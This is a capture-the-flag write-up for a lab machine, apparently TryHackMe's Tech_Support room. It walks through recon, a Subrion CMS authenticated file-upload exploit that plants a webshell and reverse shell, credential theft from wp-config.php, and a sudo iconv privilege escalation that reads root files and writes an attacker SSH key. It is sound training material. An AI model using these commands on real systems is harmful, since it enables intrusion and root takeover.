- - - 
created : 20-07-2025 

Tags : #easy #detailed 
- - - 
# Objective

Hack into the machine and investigate the target.

Please allow about 5 minutes for the machine to fully boot!

**Note**: The theme and security warnings encountered in this room are part of the challenge.
# Recon
## Rustscan/Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ rustscan -a 10.10.1.80 -- -A   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.1.80:22
Open 10.10.1.80:80
Open 10.10.1.80:139
Open 10.10.1.80:445
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROU
Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2025-07-20T18:09:32+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17348/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42051/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28440/udp): CLEAN (Timeout)
|   Check 4 (port 48512/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-07-20T12:39:30
|_  start_date: N/A
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   73.73 ms 10.8.0.1
2   75.50 ms 10.10.1.80

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.97 seconds
           Raw packets sent: 40 (2.506KB) | Rcvd: 30 (1.946KB)

```

# Enumeration

## HTTP (80)

### Gobuster 

We search for hidden directories with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.1.80/   

/.hta                 (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 11321]
/phpinfo.php          (Status: 200) [Size: 94912]
/server-status        (Status: 403) [Size: 275]
/test                 (Status: 301) [Size: 307] [--> http://10.10.1.80/test/]
/wordpress            (Status: 301) [Size: 312] [--> http://10.10.1.80/wordpress/]

```

on /phpinfo.php :

![Pasted image 20250720144954.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720144954.png)

/test :

![Pasted image 20250720144500.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720144500.png)

/wordpress :

![Pasted image 20250720144540.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720144540.png)

![Pasted image 20250720144828.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720144828.png)

So we are redirected to 10.0.2.15/admin/wp-admin page, but doesn't show up .
http://10.0.2.15/wordpress/wp-admin/
 
## SMB (445 - 139)

We can use [Enum4linux](../../3%20-%20Tags/Hacking%20Tools/Enum4linux.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ enum4linux  -a 10.10.1.80

[+] Got OS info for 10.10.1.80 from srvinfo:                                                                                                                                                                                                 
        TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu)                                                                                                                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

==================================( Share Enumeration on 10.10.1.80 )==================================
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

+] Enumerating users using SID S-1-22-1 and logon username '', password ''             
                                                                                        
S-1-22-1-1000 Unix User\scamsite (Local User)      

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                                                                                  
                                                                                        
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                       
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-2071169391-1069193170-3284189824 and logon username '', password ''                                                                    
                                                                                        
S-1-5-21-2071169391-1069193170-3284189824-501 TECHSUPPORT\nobody (Local User)           
S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\None (Domain Group)
^C
```

We get a user : **scamsite**, and we get shares.
### SMBmap

We can use [SMBclient](../../3%20-%20Tags/Hacking%20Tools/SMBclient.md) to see if we can read some files on the shares :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ smbclient \\\\10.10.1.80\\websvr
Password for [WORKGROUP\mdn0x]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May 29 09:17:38 2021
  ..                                  D        0  Sat May 29 09:03:47 2021
  enter.txt                           N      273  Sat May 29 09:17:38 2021

                8460484 blocks of size 1024. 5697176 blocks available
smb: \> cat enter.txt
cat: command not found
smb: \> type enter.txt
type: command not found
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)

```

And we read the enter.txt file :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ cat enter.txt 
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

```

we have a password, note it's Magical Formula. 
#### CyberChef

We go to [CyberChef](../../3%20-%20Tags/Hacking%20Tools/CyberChef.md) and crack the password with MAGIC :

![Pasted image 20250720160838.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720160838.png)

cracked : **Scam2021** .
# Exploit

## First Access

so we visit /subrion/panel and use the credentials :

![Pasted image 20250720161020.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720161020.png)

And we are in .

![Pasted image 20250720161124.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720161124.png)

## Metasploit

Now let's research about Subrion CMS v 4.2.1 on [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) :

```
msf6 > search Subrion CMS

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/http/subrion_cms_file_upload_rce  2018-11-04       excellent  Yes    Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE
```

Let's use it :

```
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set Password Scam2021
Password => Scam2021
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set rhosts 10.10.1.80
rhosts => 10.10.1.80
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set lhost 10.8.162.183
lhost => 10.8.162.183
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set TARGETURI /subrion/panel
TARGETURI => /subrion/panel
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > exploit
[*] Started reverse TCP handler on 10.8.162.183:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response at: http://10.10.1.80/subrion/panel/panel/
[+] Target is running Subrion CMS.
[*] Checking Subrion CMS version...
[+] Target is running Subrion CMS Version 4.2.1.
[+] The target appears to be vulnerable. However, this version check does not guarantee that the target is vulnerable, since a fix for the vulnerability can easily be applied by a web admin.
[*] Connecting to Subrion Admin Panel login page to obtain CSRF token...
[+] Successfully obtained CSRF token: 7w2BoAqe01nfK6ggtrTakYwpjfd6uCzXTx0yXdpj
[*] Logging in to Subrion Admin Panel at: http://10.10.1.80/subrion/panel/panel/ using credentials admin:Scam2021

```

I can't have a meterpreter shell idk why don't work.
## Searchsploit

We will use [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) to search for the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) and use it :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ python3 49876.py -h
Usage: 49876.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri http://target/panel
  -l USER, --user=USER  User credential to login
  -p PASSW, --passw=PASSW
                        Password credential to login
                                                                                                               
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ python3 49876.py -u http://10.10.1.80/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.1.80/subrion/panel/
[+] Success!
^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B[+] Got CSRF token: Y3RE2CooiWrYBhmUaPXfooexcSlbNJVVgrE0OFEC
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: myyxxvnjmgumqza

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.1.80/subrion/panel/uploads/myyxxvnjmgumqza.phar 

$ whoami

$ ls
myyxxvnjmgumqza.phar

```
### Shell Stabilization 

We can perform [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```
$ export TERM=xterm

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

^Z
stty raw -echo;fg
             reset
```

This seems blocking the entire system so we need some other way, i tried get a shell uploading a php_reverse_shell from pentestmonkey modified in a .phar file (read python exploit) :

![Pasted image 20250720172109.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720172109.png)

Now we can retry stabilization :

![Pasted image 20250720172446.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720172446.png)
# Lateral Movement - Privilege Escalation

We start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) with [Lateral Movement](../../3%20-%20Tags/Hacking%20Concepts/Lateral%20Movement.md) , both Subrion and [Wordpress](../../3%20-%20Tags/Hacking%20Concepts/Wordpress.md) will have database credentials stored in config files, so let’s see if we can find the password for the scamsite user :

```
www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php | grep DB
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
```

Now we try to access with this password :

```
www-data@TechSupport:/var/www/html/wordpress$ su scamsite
Password: 
scamsite@TechSupport:/var/www/html/wordpress$ 
```

And we have a shell with scamsite user, let's try `sudo -l` :

```
scamsite@TechSupport:/var/www/html/wordpress$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv

```

## GTFObins

Now we can search on [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) for iconv :

![Pasted image 20250720173537.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250720173537.png)

We can run `iconv` as root, and according to [GTFObins](https://gtfobins.github.io/gtfobins/iconv/), this can be used to read and write files as root.

This means we could go ahead and read `/root/root.txt`, but what we really want is a root shell :

```
scamsite@TechSupport:/usr/bin$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
851b8233a8c09400ec30651bd1529bf1ed02790b  -
```

To achieve this we can generate a keypair on our machine and exploit our ability to run iconv as root to add our public key to root’s authorized keys file. This will allow us to SSH to the box as root.

## Ssh-Keygen

We can use [SSH-KeyGen](../../3%20-%20Tags/Hacking%20Tools/SSH-KeyGen.md) to generate the key,then write it to our victim via iconv, and access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) from our machine as root users :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ ssh-keygen             
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/mdn0x/.ssh/id_ed25519): 
/home/mdn0x/.ssh/id_ed25519 already exists.
Overwrite (y/n)? y
Enter passphrase for "/home/mdn0x/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mdn0x/.ssh/id_ed25519
Your public key has been saved in /home/mdn0x/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:6n1u9ZUAmxsgf/uMiJkrxQSFgIGsy50tC4ZqAGfQkHA mdn0x@mdn0xonKali
The key's randomart image is:
+--[ED25519 256]--+
|*=E.. o.         |
|++.  o . . .     |
|..    . o . +    |
|o o    . . = .   |
|++. o o S . + . .|
|++ + . +   o.  ..|
|+ . o o + ..+. . |
|.. . o = .o. o.  |
|.     o.o+.      |
+----[SHA256]-----+
                                                                                                                                       
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
└─$ cat /home/mdn0x/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
```

Now we copy our **public** key it on our target in the auth keys file :

```
scamsite@TechSupport:/dev/shm$ echo "ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
" | sudo iconv -f 8859_1 -t 8859_1 -o "/root/.ssh/authorized_keys"
```

## Root SSH

Now we access with the **private** key :

```
ssh -i /home/mdn0x/.ssh/id_ed25519 root@10.10.1.80
```

Pwned !!